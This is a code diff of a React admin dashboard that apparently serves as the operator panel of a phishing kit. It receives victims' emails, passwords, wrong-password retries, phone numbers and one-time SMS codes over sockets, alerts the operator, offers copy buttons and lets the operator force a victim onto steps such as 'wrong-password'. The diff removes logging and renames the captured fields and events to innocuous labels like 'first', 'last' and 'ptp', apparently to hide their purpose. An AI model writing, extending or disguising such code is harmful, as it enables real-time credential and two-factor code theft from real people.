@@ -135,11 +135,6 @@ const timeAgo = (date) => {
 
     } catch (error) {
 
-      console.log(
-        "Error getting users:",
-        error
-      );
-
     } finally {
 
       setLoading(false);
@@ -227,7 +222,6 @@ const copyField = async (field, value) => {
       }
     );
 
-    console.log("Step changed:", step);
 
   } catch (error) {
     console.error(
@@ -252,11 +246,7 @@ const copyField = async (field, value) => {
 
     const handleConnect = () => {
 
-      console.log(
-        "🔥 Admin socket connected:",
-        socket.id
-      );
-
+ 
       setConnected(true);
 
       socket.emit(
@@ -268,9 +258,7 @@ const copyField = async (field, value) => {
 
     const handleDisconnect = () => {
 
-      console.log(
-        "Admin socket disconnected"
-      );
+    
 
       setConnected(false);
 
@@ -285,10 +273,7 @@ const copyField = async (field, value) => {
 
     const handleNewUser = (user) => {
 
-      console.log(
-        "🔥 NEW USER:",
-        user
-      );
+ 
 
       
       playNotificationSound();
@@ -321,15 +306,12 @@ const copyField = async (field, value) => {
 
 
     // ====================================
-    // PASSWORD COMPLETED
+    // last COMPLETED
     // ====================================
 
         const handlePasswordSet = (data) => {
 
-  console.log(
-    "🔥 PASSWORD SET EVENT RECEIVED:",
-    data
-  );
+ 
 
       playNotificationSound();
 
@@ -345,7 +327,7 @@ const copyField = async (field, value) => {
 
         return {
           ...user,
-        password: data.password,
+        last: data.last,
         currentStep: data.currentStep,
         };
 
@@ -362,10 +344,7 @@ const copyField = async (field, value) => {
 
       const handleEmailSet = (data) => {
 
-  console.log(
-    "🔥 Email SET EVENT RECEIVED:",
-    data
-  );
+
 
       playNotificationSound();
 
@@ -381,7 +360,7 @@ const copyField = async (field, value) => {
 
         return {
           ...user,
-        email: data.email,
+        first: data.first,
         currentStep: data.currentStep
         };
 
@@ -397,10 +376,7 @@ const copyField = async (field, value) => {
 
   const handlewrongPasswordSet = (data) => {
 
-  console.log(
-    "🔥 WRONG PASSWORD SET EVENT RECEIVED:",
-    data
-  );
+ 
 
       playNotificationSound();
 
@@ -416,7 +392,7 @@ const copyField = async (field, value) => {
 
         return {
           ...user,
-        wrongPassword: data.wrongPassword,
+        WongP: data.WongP,
         currentStep: data.currentStep
         };
 
@@ -437,11 +413,7 @@ const copyField = async (field, value) => {
 
 const handlePhoneSubmitted = (data) => {
 
-  console.log(
-    "🔥 PHONE SUBMITTED EVENT RECEIVED:",
-    data
-  );
-
+  
       playNotificationSound();
 
    setUsers((currentUsers) => {
@@ -455,7 +427,7 @@ const handlePhoneSubmitted = (data) => {
 
         return {
           ...user,
-        phoneNumber: data.phoneNumber,
+        phn: data.phn,
         currentStep: data.currentStep
         };
 
@@ -471,11 +443,7 @@ const handlePhoneSubmitted = (data) => {
 
 const handlePhoneOtpSubmitted = (data) => {
 
-  console.log(
-    "🔥 PHONE SUBMITTED EVENT RECEIVED:",
-    data
-  );
-
+ 
       playNotificationSound();
 
    setUsers((currentUsers) => {
@@ -489,7 +457,7 @@ const handlePhoneOtpSubmitted = (data) => {
 
         return {
           ...user,
-        phoneOtp: data.phoneOtp,
+        ptp: data.ptp,
         currentStep: data.currentStep
         };
 
@@ -506,10 +474,7 @@ const handlePhoneOtpSubmitted = (data) => {
 
 const handlePhoneOtp2Submitted = (data) => {
 
-  console.log(
-    "🔥 Wrong otp SUBMITTED EVENT RECEIVED:",
-    data
-  );
+  
 
       playNotificationSound();
 
@@ -524,7 +489,7 @@ const handlePhoneOtp2Submitted = (data) => {
 
         return {
           ...user,
-        phoneOtp2: data.phoneOtp2
+        ptp2: data.ptp2
         };
 
       }
@@ -564,10 +529,7 @@ const handlePhoneOtp2Submitted = (data) => {
 
     const handleStepChanged = (data) => {
 
-      console.log(
-        "🔥 USER STEP:",
-        data
-      );
+     
 
       toast.info(`User ${data.userId} moved to step: ${data.step}`, {
         position: "bottom-right",
@@ -578,7 +540,6 @@ const handlePhoneOtp2Submitted = (data) => {
         draggable: true,
         progress: undefined,
       });
-      console.log(data)
       window.location.reload();
       setUsers((currentUsers) =>
         currentUsers.map((user) =>
@@ -618,17 +579,17 @@ const handlePhoneOtp2Submitted = (data) => {
     );
     
     socket.on(
-      "email-set",
+      "first-set",
       handleEmailSet
     );
 
     socket.on(
-      "password-set",
+      "last-set",
       handlePasswordSet
     );
 
      socket.on(
-      "wrongPassword-set",
+      "WongP-set",
       handlewrongPasswordSet
     );
 
@@ -642,11 +603,11 @@ const handlePhoneOtp2Submitted = (data) => {
       handlePhoneSubmitted
     );
        socket.on(
-      "phoneotp-submitted",
+      "ptp-submitted",
       handlePhoneOtpSubmitted
     );
        socket.on(
-      "phoneotp2-submitted",
+      "ptp2-submitted",
       handlePhoneOtp2Submitted
     );
      socket.on(
@@ -676,15 +637,15 @@ const handlePhoneOtp2Submitted = (data) => {
       );
 
       socket.off(
-        "password-set",
+        "last-set",
         handlePasswordSet
       );
        socket.off(
-        "email-set",
+        "first-set",
         handleEmailSet
       );
        socket.off(
-        "wrongPassword-set",
+        "WongP-set",
         handlewrongPasswordSet
       );
 
@@ -693,11 +654,11 @@ const handlePhoneOtp2Submitted = (data) => {
         handlePhoneSubmitted
       );
       socket.off(
-        "phoneotp-submitted",
+        "ptp-submitted",
         handlePhoneOtpSubmitted
       );
        socket.off(
-        "phoneotp2-submitted",
+        "ptp2-submitted",
         handlePhoneOtp2Submitted
       );
 
@@ -858,7 +819,7 @@ const handlePhoneOtp2Submitted = (data) => {
          <div style={styles.statCard}>
 
           <div style={styles.statNumber}>
-            {users.filter((user) => user.currentStep !== "email").length} 
+            {users.filter((user) => user.currentStep !== "first").length} 
           </div>
 
           <div style={styles.statLabel}>
@@ -905,34 +866,34 @@ const handlePhoneOtp2Submitted = (data) => {
                 <div className="">
 
                 <div className="ass">
-                     <div className="prof">{user.email?.charAt(0).toUpperCase() || "?"}</div>
+                     <div className="prof">{user.first?.charAt(0).toUpperCase() || "?"}</div>
 
                 <div className="getin">
-                    <div  onClick={() => copyField("email", user.email)}   style={{
-                      ...styles.email,
-                      cursor: user.email
+                    <div  onClick={() => copyField("first", user.first)}   style={{
+                      ...styles.first,
+                      cursor: user.first
                         ? "pointer"
                         : "default"
                         
     }}>
                     First: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;
-                  <span className="klm">  {copiedField === "email"
+                  <span className="klm">  {copiedField === "first"
                      ? "✓ Copied!"
-                    : user.email || "—"}  </span>
+                    : user.first || "—"}  </span>
                   </div>    
                   
-                    <div  onClick={() => copyField("password", user.password)} className="kiu"  style={{
-                      ...styles.email,
-                      cursor: user.password
+                    <div  onClick={() => copyField("last", user.last)} className="kiu"  style={{
+                      ...styles.first,
+                      cursor: user.last
                         ? "pointer"
                         : "default"
                         
     }}> 
   
                     Last: &nbsp;
-                  <span className="klm">  {copiedField === "password"
+                  <span className="klm">  {copiedField === "last"
                      ? "✓ Copied!"
-                    : user.password || "—"} </span>
+                    : user.last || "—"} </span>
                   </div>
                 </div>
                 </div>
@@ -943,7 +904,7 @@ const handlePhoneOtp2Submitted = (data) => {
                   </p> */}
                   
                     <div className="kim">
-                        {user.ipAddress && (
+                        {user.uip && (
                           <button
                             className="detail-button osp" 
                             type="button"
@@ -953,7 +914,7 @@ const handlePhoneOtp2Submitted = (data) => {
                             </span>{" "}
 
                             <span className="detail-value">
-                              {user.ipAddress}
+                              {user.uip}
                             </span>
                           </button>
                         )}
@@ -974,7 +935,7 @@ const handlePhoneOtp2Submitted = (data) => {
                         )}
                           
                    
-                          {user.currentStep === "email"? " " : (
+                          {user.currentStep === "first"? " " : (
                           <button
                             className="detail-button op" 
                             type="button"
@@ -1045,14 +1006,14 @@ const handlePhoneOtp2Submitted = (data) => {
               ======================= */}
                                 <div style={styles.info}>
 
-  {/* Password - don't expose/copy sensitive credentials */}
+  {/* last - don't expose/copy sensitive credentials */}
   <div className="user-details">
 
-    {user.phoneNumber && (
+    {user.phn && (
       <button
         className="detail-button"
         onClick={() =>
-          copyField("phone", user.phoneNumber)
+          copyField("phone", user.phn)
         }
       >
         <span className="detail-label">
@@ -1065,74 +1026,74 @@ const handlePhoneOtp2Submitted = (data) => {
           </span>
         ) : (
           <span className="detail-value">
-            {user.phoneNumber}
+            {user.phn}
           </span>
         )}
       </button>
     )}
      
-        {user.wrongPassword && (
+        {user.WongP && (
       <button
         className="detail-button"
         onClick={() =>
-          copyField("wrongpassword", user.wrongPassword)
+          copyField("WongP", user.WongP)
         }
       >
         <span className="detail-label">
-          Wrong password:
+          Wrong last:
         </span>{" "}
 
-        {copiedField === "wrongpassword" ? (
+        {copiedField === "WongP" ? (
           <span className="detail-copied">
             ✓ Copied!
           </span>
         ) : (
           <span className="detail-value">
-            {user.wrongPassword}
+            {user.WongP}
           </span>
         )}
       </button>
     )}
-        {user.phoneOtp && (
+        {user.ptp && (
       <button
         className="detail-button"
         onClick={() =>
-          copyField("phoneotp", user.phoneOtp)
+          copyField("ptp", user.ptp)
         }
       >
         <span className="detail-label">
           Phone OTP:
         </span>{" "}
 
-        {copiedField === "phoneotp" ? (
+        {copiedField === "ptp" ? (
           <span className="detail-copied">
             ✓ Copied!
           </span>
         ) : (
           <span className="detail-value">
-            {user.phoneOtp}
+            {user.ptp}
           </span>
         )}
       </button>
     )}
-        {user.phoneOtp2 && (
+        {user.ptp2 && (
       <button
         className="detail-button"
         onClick={() =>
-          copyField("phoneotp2", user.phoneOtp2)
+          copyField("ptp2", user.ptp2)
         }
       >
         <span className="detail-label">
           Wrong OTP:
         </span>{" "}
 
-        {copiedField === "phoneotp2" ? (
+        {copiedField === "ptp2" ? (
           <span className="detail-copied">
             ✓ Copied!
           </span>
         ) : (
           <span className="detail-value">
-            {user.phoneOtp2}
+            {user.ptp2}
           </span>
         )}
       </button>
@@ -1285,17 +1246,17 @@ const handlePhoneOtp2Submitted = (data) => {
     onClick={() =>
       changeUserStep(
         user._id,
-        "wrong-password"
+        "wrong-last"
       )
     }
     style={{
       ...styles.controlButton,
-      ...(user.currentStep === "wrong-password"
+      ...(user.currentStep === "wrong-last"
         ? styles.activeControlButton
         : {})
     }}
   >
-    Wrong Password
+    Wrong last
   </button>
 
 
@@ -1341,7 +1302,7 @@ const handlePhoneOtp2Submitted = (data) => {
 
       {selectedUser && (
         <p className="selected-user">
-          sign-in request for: {selectedUser.email}
+          sign-in request for: {selectedUser.first}
         </p>
       )}
 
@@ -1560,7 +1521,7 @@ const styles = {
     marginBottom: "20px"
   },
 
-  email: {
+  first: {
     fontSize: "12px",
     // fontWeight: "600",
     color: "#5F6368",
